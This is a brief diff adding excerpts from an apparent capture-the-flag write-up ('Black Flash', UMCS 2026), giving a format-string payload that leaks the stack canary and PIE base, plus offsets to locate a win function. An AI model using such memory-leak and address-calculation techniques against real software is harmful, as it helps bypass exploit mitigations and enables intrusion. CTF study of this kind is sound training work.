@@ -1,0 +1,7 @@
+# Black Flash
+# Code and command excerpts from the UMCS UM 2026 write-up.
+
+## Leak the canary and PIE address (text)
+%p.  # repeated 25 times
+PIE base = leaked_main_return - 0x1548
+win = PIE base + 0x1261
